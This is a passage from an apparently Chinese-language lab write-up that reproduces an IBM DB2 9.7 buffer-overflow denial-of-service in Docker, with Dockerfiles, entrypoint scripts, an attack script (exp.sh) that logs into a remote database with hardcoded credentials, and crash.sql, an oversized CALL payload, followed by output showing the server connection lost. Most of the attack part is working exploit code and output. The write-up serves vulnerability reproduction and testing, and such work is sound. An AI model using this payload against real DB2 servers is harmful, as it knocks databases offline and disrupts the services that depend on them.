/etc/sysctl.conf</span></span><br><span class=\"line\"><span class=\"comment\"># RUN sysctl -p </span></span><br><span class=\"line\">RUN ipcs -l</span><br><span class=\"line\"></span><br><span class=\"line\">RUN groupadd -g 901 db2iadm1 &amp;&amp; \\</span><br><span class=\"line\">    groupadd -g 902 db2fadm1 &amp;&amp; \\</span><br><span class=\"line\">    groupadd -g 903 dasadm1  &amp;&amp; \\</span><br><span class=\"line\">    useradd -g db2iadm1 -u 801 -d /home/db2inst1 -m  db2inst1 &amp;&amp; \\ </span><br><span class=\"line\">    useradd -g db2fadm1 -u 802 -d /home/db2fenc1 -m db2fenc1 &amp;&amp; \\</span><br><span class=\"line\">    useradd -g dasadm1 -u 803 -d /home/dasadm1 -m dasusr1 &amp;&amp;\\</span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&#x27;db2inst1:123456&#x27;</span> | chpasswd</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># CMD [&quot;tail&quot;,&#x27;-f&#x27;,&#x27;/dev/null&#x27;]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># RUN cd server &amp;&amp; ./db2prereqcheck &amp;&amp;  echo &#x27;ESE&#x27; | ./db2_install -b /opt/ibm/db2/V9.7 || echo pass</span></span><br><span class=\"line\"><span class=\"comment\"># RUN cd /opt/ibm/db2/V9.7/instance &amp;&amp; ./dascrt -u dasusr1  &amp;&amp;\\</span></span><br><span class=\"line\"><span class=\"comment\">#     ./db2icrt -u db2inst1 db2inst1 </span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># RUN db2 create database KHYX_YS using codeset GBK territory CN</span></span><br><span class=\"line\"><span class=\"comment\"># RUN db2 create database KHYX_YS </span></span><br><span class=\"line\"><span class=\"comment\"># RUN db2set –all</span></span><br><span class=\"line\">COPY entrypoint.sh /entrypoint.sh</span><br><span class=\"line\">COPY exp.sh /exp.sh</span><br><span class=\"line\">COPY select.sql /select.sql</span><br><span class=\"line\">COPY crash.sql /crash.sql</span><br><span class=\"line\"></span><br><span class=\"line\">RUN <span class=\"built_in\">chmod</span> +x /entrypoint.sh</span><br><span class=\"line\">RUN <span class=\"built_in\">chmod</span> +x /exp.sh</span><br><span class=\"line\"></span><br><span class=\"line\">ENV REMOTE_IP=<span class=\"variable\">$&#123;REMOTE_IP&#125;</span></span><br><span class=\"line\">ENV REMOTE_PORT=<span class=\"variable\">$&#123;REMOTE_PORT&#125;</span></span><br><span class=\"line\">ENTRYPOINT [<span class=\"string\">&quot;/entrypoint.sh&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># CMD [&#x27;REMOTE_IP&#x27;]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># CMD [&quot;tail&quot;,&#x27;-f&#x27;,&#x27;/dev/null&#x27;]</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">EXPOSE 60000</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>镜像构建（获得docker_image_id_1）</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker build .</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h2 id=\"被测环境搭建\"><a href=\"#被测环境搭建\" class=\"headerlink\" title=\"被测环境搭建\"></a>被测环境搭建</h2><ul>\n<li><p><code>create_table.sql</code>:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">CREATE</span> DATABASE testdb3</span><br><span class=\"line\"><span class=\"keyword\">connect</span> <span class=\"keyword\">to</span> testdb3</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> tbl4 (stu_name <span class=\"type\">CHAR</span>(<span class=\"number\">10</span>) <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> <span class=\"keyword\">PRIMARY</span> KEY)</span><br><span class=\"line\"><span class=\"keyword\">ALTER</span> <span class=\"keyword\">TABLE</span> tbl4 <span class=\"keyword\">ADD</span> <span class=\"keyword\">COLUMN</span> stu_age <span class=\"type\">CHAR</span>(<span class=\"number\">10</span>)</span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> tbl4 <span class=\"keyword\">VALUES</span> (<span class=\"string\">&#x27;alice&#x27;</span>,<span class=\"string\">&#x27;20&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> tbl4 <span class=\"keyword\">VALUES</span> (<span class=\"string\">&#x27;bob&#x27;</span>,<span class=\"string\">&#x27;16&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> tbl4 <span class=\"keyword\">VALUES</span> (<span class=\"string\">&#x27;tom&#x27;</span>,<span class=\"string\">&#x27;19&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> tbl4 <span class=\"keyword\">VALUES</span> (<span class=\"string\">&#x27;john&#x27;</span>,<span class=\"string\">&#x27;32&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> tbl4 <span class=\"keyword\">VALUES</span> (<span class=\"string\">&#x27;amy&#x27;</span>,<span class=\"string\">&#x27;13&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> tbl4 <span class=\"keyword\">VALUES</span> (<span class=\"string\">&#x27;france&#x27;</span>,<span class=\"string\">&#x27;56&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> tbl4 <span class=\"keyword\">VALUES</span> (<span class=\"string\">&#x27;frank&#x27;</span>,<span class=\"string\">&#x27;41&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> tbl4</span><br></pre></td></tr></table></figure></li>\n<li><p><code>entrypoint.sh</code>:</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> server &amp;&amp; ./db2prereqcheck &amp;&amp;  <span class=\"built_in\">echo</span> <span class=\"string\">&#x27;ESE&#x27;</span> | ./db2_install -b /opt/ibm/db2/V9.7 || <span class=\"built_in\">echo</span> pass</span><br><span class=\"line\"><span class=\"built_in\">cd</span> /opt/ibm/db2/V9.7/instance &amp;&amp; ./dascrt -u dasusr1  </span><br><span class=\"line\">./db2icrt -u db2inst1 db2inst1 </span><br><span class=\"line\"></span><br><span class=\"line\">su - db2inst1 -c <span class=\"string\">&quot;db2set DB2COMM=TCPIP&quot;</span></span><br><span class=\"line\">su - db2inst1 -c <span class=\"string\">&quot;db2 update dbm cfg using SVCENAME 60000&quot;</span></span><br><span class=\"line\">su - db2inst1 -c <span class=\"string\">&quot;db2stop&quot;</span></span><br><span class=\"line\">su - db2inst1 -c <span class=\"string\">&quot;db2start&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">su - db2inst1 -c <span class=\"string\">&quot;cd / &amp;&amp; db2 -f create_table.sql&quot;</span></span><br></pre></td></tr></table></figure></li>\n<li><p><code>Dockerfile</code>:</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FROM centos:7.2.1511</span><br><span class=\"line\"></span><br><span class=\"line\">COPY v9.7_linuxx64_server.tar.gz v9.7_linuxx64_server.tar.gz</span><br><span class=\"line\"><span class=\"comment\"># COPY sysctl.conf /etc/sysctl.conf</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">RUN tar -xzvf v9.7_linuxx64_server.tar.gz</span><br><span class=\"line\">RUN <span class=\"built_in\">rm</span> v9.7_linuxx64_server.tar.gz</span><br><span class=\"line\">RUN yum install -y libstdc++ libstdc++.so.6 libaio</span><br><span class=\"line\"></span><br><span class=\"line\">RUN ipcs -l</span><br><span class=\"line\"></span><br><span class=\"line\">RUN groupadd -g 901 db2iadm1 &amp;&amp; \\</span><br><span class=\"line\">    groupadd -g 902 db2fadm1 &amp;&amp; \\</span><br><span class=\"line\">    groupadd -g 903 dasadm1  &amp;&amp; \\</span><br><span class=\"line\">    useradd -g db2iadm1 -u 801 -d /home/db2inst1 -m  db2inst1 &amp;&amp; \\ </span><br><span class=\"line\">    useradd -g db2fadm1 -u 802 -d /home/db2fenc1 -m db2fenc1 &amp;&amp; \\</span><br><span class=\"line\">    useradd -g dasadm1 -u 803 -d /home/dasadm1 -m dasusr1 &amp;&amp;\\</span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&#x27;db2inst1:123456&#x27;</span> | chpasswd</span><br><span class=\"line\"></span><br><span class=\"line\">COPY entrypoint.sh /entrypoint.sh</span><br><span class=\"line\"><span class=\"comment\"># COPY exp.sh /exp.sh</span></span><br><span class=\"line\">COPY create_table.sql /create_table.sql</span><br><span class=\"line\"><span class=\"comment\"># COPY crash.sql /crash.sql</span></span><br><span class=\"line\"></span><br><span class=\"line\">RUN <span class=\"built_in\">chmod</span> +x /entrypoint.sh</span><br><span class=\"line\"><span class=\"comment\"># RUN chmod +x /exp.sh</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ENV REMOTE_IP=$&#123;REMOTE_IP&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">ENTRYPOINT [<span class=\"string\">&quot;/entrypoint.sh&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">EXPOSE 60000</span><br><span class=\"line\"><span class=\"comment\"># CMD [&#x27;REMOTE_IP&#x27;]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># CMD [&quot;tail&quot;,&#x27;-f&#x27;,&#x27;/dev/null&#x27;]</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>镜像构建（获得docker_image_id_2）</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker build.</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h2 id=\"被测环境容器启动（比较慢）\"><a href=\"#被测环境容器启动（比较慢）\" class=\"headerlink\" title=\"被测环境容器启动（比较慢）\"></a>被测环境容器启动（比较慢）</h2><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -it -d --privileged -p 60000:60000  docker_image_id_2</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"攻击脚本执行\"><a href=\"#攻击脚本执行\" class=\"headerlink\" title=\"攻击脚本执行\"></a>攻击脚本执行</h2><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># REMOTE_IP为被测环境的ip</span></span><br><span class=\"line\"><span class=\"comment\"># REMOTE_PORT为被测环境的端口</span></span><br><span class=\"line\"><span class=\"comment\"># docker_image_id_1 为攻击镜像id</span></span><br><span class=\"line\"></span><br><span class=\"line\">docker run --network host -it -d --privileged -e REMOTE_IP=<span class=\"string\">&#x27;192.168.33.44&#x27;</span> -e REMOTE_PORT=<span class=\"string\">&#x27;60000&#x27;</span> docker_image_id_1</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"攻击成功效果\"><a href=\"#攻击成功效果\" class=\"headerlink\" title=\"攻击成功效果\"></a>攻击成功效果</h2><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">……（此处省略n行）……</span><br><span class=\"line\"></span><br><span class=\"line\">[+] 已连接成功目标数据库</span><br><span class=\"line\">[+] 正在查询目标数据库数据</span><br><span class=\"line\"></span><br><span class=\"line\">STU_NAME   STU_AGE   </span><br><span class=\"line\">---------- ----------</span><br><span class=\"line\">alice      20        </span><br><span class=\"line\">bob        16        </span><br><span class=\"line\">tom        19        </span><br><span class=\"line\">john       32        </span><br><span class=\"line\">amy        13        </span><br><span class=\"line\">france     56        </span><br><span class=\"line\">frank      41        </span><br><span class=\"line\"></span><br><span class=\"line\">7 record(s) selected.</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">[+] 正在发送PoC</span><br><span class=\"line\">[+] PoC发送成功</span><br><span class=\"line\">[+] 再次尝试查询数据库</span><br><span class=\"line\">SQL1024N  A database connection does not exist.  SQLSTATE=08003</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><p><a href=\"https://www.exploit-db.com/exploits/42260\">IBM DB2 9.7&#x2F;10.1&#x2F;10.5&#x2F;11.1 - Command Line Processor Buffer Overflow - Multiple dos Exploit</a></p>\n<h2 id=\"漏洞说明\"><a href=\"#漏洞说明\" class=\"headerlink\" title=\"漏洞说明\"></a>漏洞说明</h2><blockquote>\n<p>IBM DB2 for Linux, UNIX and Windows 9.2, 10.1, 10.5, and 11.1 (includes DB2 Connect Server) is vulnerable to a stack-based buffer overflow, caused by improper bounds checking which could allow a local attacker to execute arbitrary code.</p>\n</blockquote>\n<h2 id=\"攻击镜像构建\"><a href=\"#攻击镜像构建\" class=\"headerlink\" title=\"攻击镜像构建\"></a>攻击镜像构建</h2><ul>\n<li><p><code>exp.sh</code>:</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;[+] 正在准备连接目标db2数据库&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$1</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$2</span></span><br><span class=\"line\">db2 catalog tcpip4 node remotedb remote <span class=\"variable\">$1</span> server <span class=\"variable\">$2</span></span><br><span class=\"line\">db2 catalog database testdb3 as testdb33 at node remotedb</span><br><span class=\"line\">db2 connect to testdb33 user db2inst1 using 123456</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;[+] 已连接成功目标数据库&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;[+] 正在查询目标数据库数据&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># 查询数据</span></span><br><span class=\"line\">db2 -f select.sql</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;[+] 正在发送PoC&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># 发送 PoC</span></span><br><span class=\"line\">db2 -f crash.sql</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;[+] PoC发送成功&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;[+] 再次尝试查询数据库&quot;</span></span><br><span class=\"line\">db2 -f select.sql</span><br></pre></td></tr></table></figure></li>\n<li><p><code>select.sql</code>:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> tbl4</span><br></pre></td></tr></table></figure></li>\n<li><p><code>crash.sql</code>:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">CALL</span> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;</span><br></pre></td></tr></table></figure></li>\n<li><p><code>entrypoint.sh</code>:</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> server &amp;&amp; ./db2prereqcheck &amp;&amp;  <span class=\"built_in\">echo</span> <span class=\"string\">&#x27;ESE&#x27;</span> | ./db2_install -b /opt/ibm/db2/V9.7 || <span class=\"built_in\">echo</span> pass</span><br><span class=\"line\"><span class=\"built_in\">cd</span> /opt/ibm/db2/V9.7/instance &amp;&amp; ./dascrt -u dasusr1  </span><br><span class=\"line\">./db2icrt -u db2inst1 db2inst1 </span><br><span class=\"line\">su - db2inst1 -c <span class=\"string\">&quot;db2start&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">su - db2inst1 -c <span class=\"string\">&quot;db2set DB2COMM=TCPIP&quot;</span></span><br><span class=\"line\">su - db2inst1 -c <span class=\"string\">&quot;db2 update dbm cfg using SVCENAME 60000&quot;</span></span><br><span class=\"line\">su - db2inst1 -c <span class=\"string\">&quot;db2stop&quot;</span></span><br><span class=\"line\">su - db2inst1 -c <span class=\"string\">&quot;db2start&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;finish&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;Remote IP: <span class=\"variable\">$REMOTE_IP</span>&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;Remote PORT: <span class=\"variable\">$REMOTE_PORT</span>&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># STR=$(echo $3 | cut -d &quot;[&quot; -f 2 |cut -d  &quot;]&quot; -f 1 | cut -d &quot;&#x27;&quot; -f 2)</span></span><br><span class=\"line\"><span class=\"comment\"># echo $STR</span></span><br><span class=\"line\">su - db2inst1 -c <span class=\"string\">&quot;cd / &amp;&amp; bash /exp.sh <span class=\"variable\">$REMOTE_IP</span> <span class=\"variable\">$REMOTE_PORT</span>&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">tail</span> -f /dev/null</span><br></pre></td></tr></table></figure></li>\n<li><p><code>Dockerfile</code>:</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FROM centos:7.2.1511</span><br><span class=\"line\"></span><br><span class=\"line\">COPY v9.7_linuxx64_server.tar.gz v9.7_linuxx64_server.tar.gz</span><br><span class=\"line\"><span class=\"comment\"># COPY sysctl.conf /etc/sysctl.conf</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">RUN tar -xzvf v9.7_linuxx64_server.tar.gz</span><br><span class=\"line\">RUN <span class=\"built_in\">rm</span> v9.7_linuxx64_server.tar.gz</span><br><span class=\"line\">RUN yum install -y libstdc++ libstdc++.so.6 libaio</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># RUN chmod 644 /etc/sysctl.conf</span></span><br><span class=\"line\"><span class=\"comment\"># RUN sysctl -p </span></span><br><span class=\"line\">RUN ipcs -l</span><br><span class=\"line\"></span><br><span class=\"line\">RUN groupadd -g 901 db2iadm1 &amp;&amp; \\</span><br><span class=\"line\">    groupadd -g 902 db2fadm1 &amp;&amp; \\</span><br><span class=\"line\">    groupadd -g 903 dasadm1  &amp;&amp; \\</span><br><span class=\"line\">    useradd -g db2iadm1 -u 801 -d /home/db2inst1 -m  db2inst1 &amp;&amp; \\ </span><br><span class=\"line\">    useradd -g db2fadm1 -u 802 -d /home/db2fenc1 -m db2fenc1 &amp;&amp; \\</span><br><span class=\"line\">    useradd -g dasadm1 -u 803 -d /home/dasadm1 -m dasusr1 &amp;&amp;\\</span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&#x27;db2inst1:123456&#x27;</span> | chpasswd</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># CMD [&quot;tail&quot;,&#x27;-f&#x27;,&#x27;/dev/null&#x27;]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># RUN cd server &amp;&amp; ./db2prereqcheck &amp;&amp;  echo &#x27;ESE&#x27; | ./db2_install -b /opt/ibm/db2/V9.7 || echo pass</span></span><br><span class=\"line\"><span class=\"comment\"># RUN cd /opt/ibm/db2/V9.7/instance &amp;&amp; ./dascrt -u dasusr1  &amp;&amp;\\</span></span><br><span class=\"line\"><span 